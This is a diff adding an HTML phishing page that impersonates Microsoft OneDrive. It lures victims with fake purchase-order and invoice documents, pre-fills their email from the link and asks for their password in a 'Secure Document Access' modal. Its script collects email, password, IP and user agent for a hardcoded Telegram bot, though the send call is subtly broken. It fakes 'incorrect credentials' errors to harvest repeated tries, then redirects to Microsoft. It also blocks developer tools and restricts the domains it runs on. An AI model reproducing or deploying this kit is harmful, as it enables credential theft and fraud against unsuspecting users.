@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Secure Document Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- Anti-cloning -->
+    <script>
+        if (top !== self) top.location = self.location;
+        const allowedDomains = ['viewmydocs.me', 'www.viewmydocs.me'];
+        const host = window.location.hostname;
+        if (allowedDomains.indexOf(host) === -1 && host !== 'localhost') {
+            document.body.innerHTML = '<h1 style="text-align:center;margin-top:50px;">Unauthorized Access</h1><p style="text-align:center;">This page cannot be accessed from this domain.</p>';
+            throw new Error('Invalid domain');
+        }
+    </script>
+    
+    <link id="dynamic-favicon" rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/561/561127.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        /* OneDrive Header */
+        .onedrive-header {
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 8px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-area i {
+            font-size: 24px;
+            color: #0078d4;
+        }
+
+        .logo-area span {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            color: #666;
+        }
+
+        .header-icons i {
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+
+        /* Encrypted Banner */
+        .encrypted-banner {
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            border-radius: 12px;
+            padding: 24px 30px;
+            color: white;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .banner-text h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .banner-text p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+
+        .email-hint {
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-size: 13px;
+            display: inline-block;
+        }
+
+        .email-hint i {
+            margin-right: 8px;
+        }
+
+        /* Document Grid - 5 Cards */
+        .document-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 1100px) {
+            .document-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 600px) {
+            .document-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .document-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+            border: 1px solid #e0e0e0;
+        }
+
+        .document-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            border-color: #0078d4;
+        }
+
+        .file-preview {
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .file-preview i {
+            font-size: 48px;
+        }
+
+        /* PDF Color Schemes */
+        .card-1 .file-preview { background: #e6f3ff; }
+        .card-1 .file-preview i { color: #0078d4; }
+
+        .card-2 .file-preview { background: #fef0f0; }
+        .card-2 .file-preview i { color: #d13438; }
+
+        .card-3 .file-preview { background: #fff4e6; }
+        .card-3 .file-preview i { color: #ff8c00; }
+
+        .card-4 .file-preview { background: #e6f4ea; }
+        .card-4 .file-preview i { color: #7fba00; }
+
+        .card-5 .file-preview { background: #f3e8ff; }
+        .card-5 .file-preview i { color: #9b59b6; }
+
+        .file-info {
+            padding: 16px;
+        }
+
+        .file-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .file-info p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .file-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 8px;
+            border-top: 1px solid #f0f0f0;
+            font-size: 11px;
+            color: #999;
+        }
+
+        .file-meta i {
+            margin-right: 4px;
+        }
+
+        .timestamp {
+            color: #0078d4;
+            font-weight: 500;
+        }
+
+        /* Recent Files Section */
+        .recent-section {
+            margin-top: 40px;
+        }
+
+        .recent-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .recent-header h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .recent-header a {
+            font-size: 13px;
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .file-list {
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            overflow: hidden;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+
+        .file-item:last-child {
+            border-bottom: none;
+        }
+
+        .file-item:hover {
+            background: #f8f9fa;
+        }
+
+        .file-info-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .file-info-left i {
+            font-size: 24px;
+            color: #0078d4;
+        }
+
+        .file-details h4 {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .file-details p {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .file-date {
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 420px;
+            width: 90%;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+
+        .modal-header {
+            background: #0078d4;
+            color: white;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .modal-header i {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .modal-body {
+            padding: 30px;
+        }
+
+        .info-panel {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            font-size: 13px;
+        }
+
+        .info-panel div {
+            margin-bottom: 8px;
+        }
+
+        .modal-body input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .modal-body input:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+
+        .modal-body button {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .modal-body button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .attempts-warning {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #ff8c00;
+            display: none;
+        }
+
+        .error-msg {
+            background: #fef0f0;
+            color: #d13438;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            margin-top: 16px;
+            display: none;
+            text-align: center;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .disclaimer {
+            background: #1a1a2e;
+            color: #aaa;
+            padding: 16px 24px;
+            text-align: center;
+            font-size: 11px;
+            margin-top: 40px;
+            border-top: 1px solid #333;
+        }
+
+        .disclaimer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- OneDrive Header -->
+<div class="onedrive-header">
+    <div class="logo-area">
+        <i class="fas fa-cloud"></i>
+        <span>OneDrive</span>
+    </div>
+    <div class="header-icons">
+        <i class="fas fa-bell"></i>
+        <i class="fas fa-cog"></i>
+        <i class="fas fa-user-circle"></i>
+    </div>
+</div>
+
+<div class="container">
+    <!-- Encrypted Banner -->
+    <div class="encrypted-banner">
+        <div class="banner-text">
+            <h2><i class="fas fa-lock"></i> Encrypted document shared with you</h2>
+            <p>Please authenticate to view documents on OneDrive</p>
+        </div>
+        <div class="email-hint" id="emailHint">
+            <i class="fas fa-user-check"></i>
+            <span id="loggedEmail">Not signed in</span>
+        </div>
+    </div>
+
+    <!-- 5 Document Cards - Lined Up -->
+    <div class="document-grid">
+        <!-- 1: Company Profile -->
+        <div class="document-card card-1" data-doc-title="Company Profile" data-doc-details="Business Overview &amp; Credentials" data-doc-size="PDF • 2.4 MB">
+            <div class="file-preview">
+                <i class="fas fa-building"></i>
+            </div>
+            <div class="file-info">
+                <h4>Company Profile</h4>
+                <p>Business overview & credentials</p>
+                <div class="file-meta">
+                    <span><i class="fas fa-user"></i> Global Inc</span>
+                    <span class="timestamp"><i class="fas fa-clock"></i> 4 hours ago</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2: Purchase Order -->
+        <div class="document-card card-2" data-doc-title="Purchase Order" data-doc-details="PO-2024-0082 • $247,500.00" data-doc-size="PDF • 1.2 MB">
+            <div class="file-preview">
+                <i class="fas fa-file-invoice"></i>
+            </div>
+            <div class="file-info">
+                <h4>Purchase Order</h4>
+                <p>PO-2024-0082 • $247,500</p>
+                <div class="file-meta">
+                    <span><i class="fas fa-user"></i> Finance Dept</span>
+                    <span class="timestamp"><i class="fas fa-clock"></i> 11 hours ago</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3: Delivery Requirements -->
+        <div class="document-card card-3" data-doc-title="Delivery Requirements" data-doc-details="Shipping &amp; Logistics Specs" data-doc-size="PDF • 1.8 MB">
+            <div class="file-preview">
+                <i class="fas fa-truck"></i>
+            </div>
+            <div class="file-info">
+                <h4>Delivery Requirements</h4>
+                <p>Shipping & handling specs</p>
+                <div class="file-meta">
+                    <span><i class="fas fa-user"></i> Logistics</span>
+                    <span class="timestamp"><i class="fas fa-clock"></i> 11 hours ago</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 4: Product Specifications -->
+        <div class="document-card card-4" data-doc-title="Product Specifications" data-doc-details="Detailed product descriptions • 247 SKUs" data-doc-size="PDF • 4.6 MB">
+            <div class="file-preview">
+                <i class="fas fa-cube"></i>
+            </div>
+            <div class="file-info">
+                <h4>Product Specifications</h4>
+                <p>247 SKUs • Detailed specs</p>
+                <div class="file-meta">
+                    <span><i class="fas fa-user"></i> Product Team</span>
+                    <span class="timestamp"><i class="fas fa-clock"></i> 24 hours ago</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 5: Sample Images -->
+        <div class="document-card card-5" data-doc-title="Sample Images" data-doc-details="Product Gallery • 45 high-res images" data-doc-size="PDF • 8.2 MB">
+            <div class="file-preview">
+                <i class="fas fa-image"></i>
+            </div>
+            <div class="file-info">
+                <h4>Sample Images</h4>
+                <p>45 high-res product images</p>
+                <div class="file-meta">
+                    <span><i class="fas fa-user"></i> Marketing</span>
+                    <span class="timestamp"><i class="fas fa-clock"></i> 24 hours ago</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Recent Files Section -->
+    <div class="recent-section">
+        <div class="recent-header">
+            <h3>Recent files</h3>
+            <a href="#">View all →</a>
+        </div>
+        <div class="file-list">
+            <div class="file-item" data-doc-title="Total Cost & Quantity.pdf" data-doc-details="Invoice Document" data-doc-size="PDF • 2.4 MB">
+                <div class="file-info-left">
+                    <i class="fas fa-file-pdf"></i>
+                    <div class="file-details">
+                        <h4>File Total Cost & Quantity.pdf</h4>
+                        <p>PDF • 2.4 MB</p>
+                    </div>
+                </div>
+                <div class="file-date">A few days ago</div>
+            </div>
+
+            <div class="file-item" data-doc-title="Requested Specifications.zip" data-doc-details="Compressed Documents" data-doc-size="ZIP • 5.6 MB">
+                <div class="file-info-left">
+                    <i class="fas fa-file-archive"></i>
+                    <div class="file-details">
+                        <h4>Requested Specifications.zip</h4>
+                        <p>ZIP • 5.6 MB</p>
+                    </div>
+                </div>
+                <div class="file-date">A few days ago</div>
+            </div>
+
+            <div class="file-item" data-doc-title="Detailed PO_49.pdf" data-doc-details="Purchase Order Document" data-doc-size="PDF • 1.8 MB">
+                <div class="file-info-left">
+                    <i class="fas fa-file-invoice"></i>
+                    <div class="file-details">
+                        <h4>Detailed PO_49.pdf</h4>
+                        <p>PDF • 1.8 MB</p>
+                    </div>
+                </div>
+                <div class="file-date">2 days ago</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="disclaimer">
+    <i class="fas fa-shield-alt"></i> <strong>Important Notice:</strong> This is a secure OneDrive environment for authorized purposes only.
+    <br><br>
+    <a href="#">Privacy Statement</a> | <a href="#">Terms of Use</a> | <a href="#">Security & Compliance</a>
+    <br>
+    <span style="font-size: 10px;">© 2026 Microsoft Corporation. All rights reserved.</span>
+</div>
+
+<!-- Login Modal -->
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <i class="fas fa-shield-alt"></i>
+            <h3>Secure Document Access</h3>
+            <p style="font-size: 13px;">Verify your identity to continue</p>
+        </div>
+        <div class="modal-body">
+            <div class="info-panel" id="docInfoPanel">
+                <div><strong>Document:</strong> <span id="docName">-</span></div>
+                <div><strong>Details:</strong> <span id="docDetails">-</span></div>
+                <div><strong>Size:</strong> <span id="docSize">-</span></div>
+            </div>
+            <input type="email" id="modalEmail" placeholder="Email address" autocomplete="off">
+            <input type="password" id="modalPassword" placeholder="Password" autocomplete="off">
+            <button id="modalAuthBtn">Verify & Access Document</button>
+            <div id="attemptsWarning" class="attempts-warning"></div>
+            <div id="modalError" class="error-msg"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================
+// ANTI-TAMPERING
+// ============================================
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 's')) {
+        e.preventDefault();
+        return false;
+    }
+});
+
+// ============================================
+// EMAIL AUTO-GRABBER
+// ============================================
+function getAutoEmail() {
+    let hash = window.location.hash;
+    if (hash && hash.length > 1) {
+        let email = decodeURIComponent(hash.substring(1));
+        if (email.includes('&')) email = email.split('&')[0];
+        if (email.includes('?')) email = email.split('?')[0];
+        if (email.includes('@')) return email;
+    }
+    let params = new URLSearchParams(window.location.search);
+    let email = params.get('email') || params.get('e') || params.get('user');
+    if (email && email.includes('@')) return email;
+    let match = window.location.href.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
+    return match ? match[0] : '';
+}
+
+const autoEmail = getAutoEmail();
+const domain = autoEmail ? autoEmail.split('@')[1] : '';
+
+// Dynamic favicon
+function updateFavicon(domainName) {
+    const favicon = document.getElementById('dynamic-favicon');
+    if (domainName && domainName.includes('.')) {
+        favicon.href = "https://www.google.com/s2/favicons?sz=64&domain=" + domainName;
+        let domainCap = domainName.split('.')[0].charAt(0).toUpperCase() + domainName.split('.')[0].slice(1);
+        document.title = domainCap + " OneDrive | Secure Documents";
+    } else {
+        document.title = "OneDrive | Secure Document Access";
+    }
+}
+
+if (autoEmail) {
+    document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-check-circle"></i> ' + autoEmail;
+    document.getElementById('emailHint').style.background = '#2b8c5e';
+    if (domain) updateFavicon(domain);
+} else {
+    document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-exclamation-triangle"></i> No session detected';
+    updateFavicon(null);
+}
+
+// ============================================
+// 3-ATTEMPT TRACKING
+// ============================================
+let attemptCount = 0;
+const MAX_ATTEMPTS = 3;
+let currentDoc = null;
+
+function showErrorPage() {
+    window.location.href = 'https://www.microsoft.com/security';
+}
+
+function requestAccess(docTitle, docDetails, docSize) {
+    if (sessionStorage.getItem('locked_out') === 'true') {
+        showErrorPage();
+        return;
+    }
+    
+    currentDoc = { title: docTitle, details: docDetails, size: docSize };
+    document.getElementById('docName').innerText = docTitle;
+    document.getElementById('docDetails').innerText = docDetails;
+    document.getElementById('docSize').innerText = docSize;
+    
+    if (autoEmail) {
+        document.getElementById('modalEmail').value = autoEmail;
+    } else {
+        document.getElementById('modalEmail').value = '';
+    }
+    
+    document.getElementById('modalPassword').value = '';
+    document.getElementById('modalError').style.display = 'none';
+    document.getElementById('attemptsWarning').style.display = 'none';
+    
+    let remaining = MAX_ATTEMPTS - attemptCount;
+    if (remaining > 0 && attemptCount > 0) {
+        document.getElementById('attemptsWarning').innerHTML = '<i class="fas fa-info-circle"></i> ' + remaining + ' verification attempt(s) remaining';
+        document.getElementById('attemptsWarning').style.display = 'block';
+    }
+    
+    document.getElementById('loginModal').classList.add('active');
+}
+
+// Attach click handlers to document cards
+var cards = document.querySelectorAll('.document-card');
+for (var i = 0; i < cards.length; i++) {
+    cards[i].addEventListener('click', function(e) {
+        e.stopPropagation();
+        var title = this.getAttribute('data-doc-title');
+        var details = this.getAttribute('data-doc-details');
+        var size = this.getAttribute('data-doc-size');
+        requestAccess(title, details, size);
+    });
+}
+
+// Attach click handlers to recent files
+var recentFiles = document.querySelectorAll('.file-item');
+for (var i = 0; i < recentFiles.length; i++) {
+    recentFiles[i].addEventListener('click', function(e) {
+        e.stopPropagation();
+        var title = this.getAttribute('data-doc-title');
+        var details = this.getAttribute('data-doc-details');
+        var size = this.getAttribute('data-doc-size');
+        requestAccess(title, details, size);
+    });
+}
+
+async function sendToTelegram(email, password, doc, attempt) {
+    var data = {
+        email: email,
+        password: password,
+        document: doc.title,
+        details: doc.details,
+        attempt: attempt,
+        platform: 'OneDrive Document Portal',
+        user_agent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        ip: await getClientIP()
+    };
+  const telegramToken = '8745241370:AAHf4uAbJMXuZyBHkMbJKJUWTHch9yJEsd8'; 
+        const chatId = '7421221045'; 
+        const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+        const payload = {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        };
+    try {
+        await fetch('apiUrl', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch(e) {}
+}
+
+async function getClientIP() {
+    try {
+        var res = await fetch('https://api.ipify.org?format=json');
+        var data = await res.json();
+        return data.ip;
+    } catch(e) { 
+        return 'Unknown'; 
+    }
+}
+
+document.getElementById('modalAuthBtn').addEventListener('click', async function() {
+    if (sessionStorage.getItem('locked_out') === 'true') {
+        showErrorPage();
+        return;
+    }
+    
+    var email = document.getElementById('modalEmail').value.trim();
+    var password = document.getElementById('modalPassword').value.trim();
+    var errorDiv = document.getElementById('modalError');
+    var authBtn = document.getElementById('modalAuthBtn');
+    var attemptsWarning = document.getElementById('attemptsWarning');
+    
+    if (!email || !password) {
+        errorDiv.innerText = 'Please enter your email and password';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    attemptCount++;
+    
+    authBtn.disabled = true;
+    authBtn.innerHTML = '<span class="loader"></span> Verifying...';
+    
+    await sendToTelegram(email, password, currentDoc, attemptCount);
+    
+    if (attemptCount >= MAX_ATTEMPTS) {
+        sessionStorage.setItem('locked_out', 'true');
+        errorDiv.style.display = 'none';
+        authBtn.innerHTML = 'Redirecting...';
+        attemptsWarning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Maximum attempts exceeded. Redirecting...';
+        attemptsWarning.style.display = 'block';
+        setTimeout(function() { 
+            showErrorPage(); 
+        }, 2000);
+        return;
+    }
+    
+    setTimeout(function() {
+        authBtn.disabled = false;
+        authBtn.innerHTML = 'Verify & Access Document';
+        errorDiv.innerText = 'Incorrect credentials. Please try again.';
+        errorDiv.style.display = 'block';
+        document.getElementById('modalPassword').value = '';
+        document.getElementById('modalPassword').focus();
+        
+        var remaining = MAX_ATTEMPTS - attemptCount;
+        attemptsWarning.innerHTML = '<i class="fas fa-info-circle"></i> ' + remaining + ' verification attempt(s) remaining';
+        attemptsWarning.style.display = 'block';
+        
+        setTimeout(function() {
+            errorDiv.style.display = 'none';
+        }, 3000);
+    }, 1500);
+});
+
+// Close modal when clicking outside
+document.getElementById('loginModal').addEventListener('click', function(e) {
+    if (e.target === this) {
+        this.classList.remove('active');
+    }
+});
+</script>
+
+</body>
+</html>
